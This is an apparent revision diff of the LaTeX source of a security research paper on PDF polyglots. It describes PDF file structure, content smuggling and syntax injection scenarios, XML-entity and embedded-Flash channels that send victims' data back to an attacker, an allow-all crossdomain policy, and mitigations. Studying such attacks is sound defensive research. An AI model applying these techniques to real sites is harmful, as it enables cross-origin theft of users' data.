+things, go to a specific page, play a sound, execute JavaScript or launch a command.
+
+% stream objects
+\paragraph{Stream objects}
+A stream is an unlimited sequence of bytes. A stream object is indirect and consists of a 
+dictionary, describing the stream, and the associated stream delimited by the 
+"stream" and "endstream" keywords. 
+%
+According to the specification, the stream dictionary shall contain a \emph{Length} 
+name to specify the length of the stream. In practice this can be omitted as 
+long as the delimiting keywords are in place.
+%
+PDF supports encoding of streams, in which
+case the dictionary describe which filters are required to decode the stream.
+
+% cross-reference
+\subsubsection{Cross-reference}
+The cross-reference section is a record of the location of indirect objects 
+within a file. The location is specified as the byte offset from the beginning 
+of the file. The cross-reference section is opened with the "xref" keyword,
+followed by one record for each indirect object. The cross-reference section 
+will be reconstructed if missing and can therefore be omitted.
+
+% trailer
+\subsubsection{Trailer}
+The trailer is composed of a trailer dictionary, a pointer to the cross-reference 
+section and an end-of-file marker. The trailer dictionary is introduced by the 
+"trailer" keyword. 
+%
+\emph{Root} is in practice the only mandatory name in the trailer dictionary, referencing the root of the 
+%
+document structure. The "startxref" keyword is followed by the number of bytes from 
+the beginning of the file to the first cross-reference section. As with the 
+cross-reference section, it can be omitted. The string "\%\%EOF" marks the 
+end-of-file, but can be omitted.
+
 \subsection{PDF-based polyglots}
@@
 \paragraph{PDF as the malicious format}
-As detailed in the content smuggling scenario in Section~\ref{sec:smuggling}, the 
+In the content smuggling scenario in Section~\ref{sec:smuggling}, the 
 attacker uploads the PDF polyglot to a vulnerable content hosting service. 
@@
 Listing~\ref{lst:xml-pdf} contains an example PDF document that uses XML external 
-entities. Note that the one-way method \emph{getURL} is used to communicate the 
+entities. The one-way method \emph{getURL} is used to communicate the 
 information back to the attacker. Given the compact size of the example, it is useful for the syntax 
@@
 has been removed. Thereby the risks of leakage of sensitive information is significantly reduced.
+
+\paragraph{Embedded Flash}
+By embedding a Flash file in the PDF document the capabilities of the format can be 
+extended even further. The Flash runtime supports bidirectional communication in 
+accordance with SOP.
+%
+The embedded Flash inherits the origin of the PDF document, thus it can 
+request and read any document from the originating server. Unlike the XML
+method, there are no restrictions on what content can be requested, thus making 
+it the most versatile of the available communication methods. The only drawback 
+using this approach is the significant increase in terms of file size. Even the compact 
+Flash code in Listing~\ref{lst:flash-pdf} will result in a 6 kB Flash file. 
+This suggests that this method might be better suited for the content smuggling 
+scenario in Section~\ref{sec:smuggling}, rather than the syntax injection scenario.
+
+Cross-origin communication in Flash adheres to the same-origin policy. However, this is not a restriction, since
+ Flash also supports cross-origin communication via  
+cross-origin resource sharing. Using CORS, a web server can relax the SOP to allow access to specified content.
+%As mentioned, the embedded Flash file inherits the origin of the document.
+An attacker can set an allow-all cross-origin policy, such as in Listing~\ref{lst:crossdomain}, 
+that open up for two way communication.
 
@@
 
-\paragraph{Embedded Flash}
-By embedding a Flash file in the PDF document the capabilities of the format can be 
-extended even further. The Flash runtime supports bidirectional communication in 
-accordance with SOP.
-%
-The embedded Flash inherits the origin of the PDF document, thus it can 
-request and read any document from the originating server. Unlike the XML
-method, there are no restrictions on what content can be requested, thus making 
-it the most versatile of the available communication methods. The only drawback 
-using this approach is the significant increase in terms of file size. Even the compact 
-Flash code in Listing~\ref{lst:flash-pdf} will result in a 6 kB Flash file. 
-This suggests that this method might be better suited for the content smuggling 
-scenario in Section~\ref{sec:smuggling}, rather than the syntax injection scenario.
-
 \begin{lstlisting}[label=lst:flash-pdf, caption=Flash code for communication]
@@
 \end{lstlisting}
-
-Cross-origin communication in Flash adheres to the same-origin policy. However, this is not a restriction, since
- Flash also supports cross-origin communication via  
-cross-origin resource sharing. Using CORS, a web server can relax the SOP to allow access to specified content.
-%As mentioned, the embedded Flash file inherits the origin of the document.
-An attacker can set an allow-all cross-origin policy, such as in Listing~\ref{lst:crossdomain}, 
-that open up for two way communication.
 
@@
 \label{sec:smuggling-mitigation}
-The current best-practice recommendation from Google~\cite{Google:ContentHosting} 
-on hosting user-supplied content, is to serve the content from a sandboxed origin that is 
+The current best-practice recommendation
+on hosting user-supplied content 
+is to serve the content from a sandboxed origin that is 
 completely separate, as per SOP, and isolated from the sensitive services. 
-These best-practices successfully prevents content smuggling 
-attacks, as the restrictions of the SOP prevents the content from accessing any sensitive 
+These best-practices, provided by Google~\cite{Google:ContentHosting}, successfully prevents content smuggling 
+attacks as the restrictions of the SOP prevents the content from accessing any sensitive 
 resources in the origin of the web service.

### 2013-08-26 main.tex
Final tidying up and images revert

@@
 
+\vfill\eject
 %1 pages
@@
   \center
-  \includegraphics[width=0.49\textwidth]{scenario.pdf}
+  \includegraphics[width=0.49\textwidth]{scenario.png}
   \caption{Overview of the scenario}
@@
   \center
-  \includegraphics[width=0.49\textwidth]{injection-scenario.pdf}
+  \includegraphics[width=0.49\textwidth]{injection-scenario.png}
   \caption{Syntax injection scenario}
@@
 \paragraph{Scenario}
-The content smuggling scenario proceeds as illustrated in Figure~\ref{fig:scenario}.
+The content smuggling scenario proceeds as illustrated in Figure~\ref{fig:smuggling-scenario}.
 Similarly to the previous scenarios, the victim is an authenticated user of a targeted vulnerable web site, \emph{vulnerable.com}. 
@@
 
-%\begin{figure}[t]
-%  \center
-%  \includegraphics[width=0.49\textwidth]{smuggling-scenario.png}
-%  \caption{Content smuggling scenario}
-%  \label{fig:smuggling-scenario}
-%\end{figure}
+\begin{figure}[t]
+  \center
+  \includegraphics[width=0.49\textwidth]{smuggling-scenario.png}
+  \caption{Content smuggling scenario}
+  \label{fig:smuggling-scenario}
+\end{figure}
 
@@
 
-\subsection{Portable Document Format}
-\label{sec:format}
-% Why PDF format?
-
-The \emph{Portable Document Format} (PDF) is a widely used document format 
-capable of displaying text, rendering graphics, scripting, animation and other 
-dynamic content. It is a container format in the sense that it allows 
-embedding of files and resources.
-
-According to the PDF specification~\cite{PDF:ISO08} a PDF file is composed of
-a header, several objects, a cross-reference section and a trailer. Listing~\ref{lst:sample-pdf} 
-shows a sample of how a PDF file is structured and its elements. Supposedly, it is also a minimal PDF file according to the specification.
-
-% header
-\subsubsection{Header}
-The header consists of the string "\%PDF-" followed by a version number. 
-The version is denoted by a 
-major and a minor version number of the form "\emph{M.m}". Because the version can 
-be specified elsewhere, the version number is not required to be part of the 
-header.
+\vfill\eject
 
@@
 endobj
-5 0 obj
-<< /Length 35 >>
+5 0 obj << /Length 35 >>
 stream
@@
 
+\subsection{Portable Document Format}
+\label{sec:format}
+% Why PDF format?
+
+The \emph{Portable Document Format} (PDF) is a widely used document format 
+capable of displaying text, rendering graphics, scripting, animation and other 
+dynamic content. It is a container format in the sense that it allows 
+embedding of files and resources.
+
+According to the PDF specification~\cite{PDF:ISO08} a PDF file is composed of
+a header, several objects, a cross-reference section and a trailer. Listing~\ref{lst:sample-pdf} 
+shows a sample of how a PDF file is structured and its elements. Supposedly, it is also a minimal PDF file according to the specification.
+
+% header
+\subsubsection{Header}
+The header consists of the string "\%PDF-" followed by a version number. 
+The version is denoted by a 
+major and a minor version number of the form "\emph{M.m}". Because the version can 
+be specified elsewhere, the version number is not required to be part of the 
+header.
+
 % objects
@@
         });
-    }
-  }
-}
+}}}
 \end{lstlisting}
@@
 \begin{lstlisting}[label=lst:crossdomain, caption=Allow-all crossdomain.xml]
-<?xml version="1.0"?>
 <cross-domain-policy>
@@
 per Section~\ref{sec:vuln}, without any restrictions or modifications.
-
-\paragraph{Internet Explorer}
-Microsoft's browser, Internet Explorer, is susceptible to the attacks. However, 
-it seems to only support embedding of PDF documents using the \emph{embed} tag. 
-This is not a major obstacle in exploiting the vulnerability, as the \emph{embed} and 
-\emph{object} tags are interchangeable in this respect.
 
@@
 
-\begin{table}[h!]
+\paragraph{Internet Explorer}
+Microsoft's browser, Internet Explorer, is susceptible to the attacks. However, 
+it seems to only support embedding of PDF documents using the \emph{embed} tag. 
+This is not a major obstacle in exploiting the vulnerability, as the \emph{embed} and 
+\emph{object} tags are interchangeable in this respect.
+
+\begin{table}[t]
 \begin{tabular}{l|c|c|c}
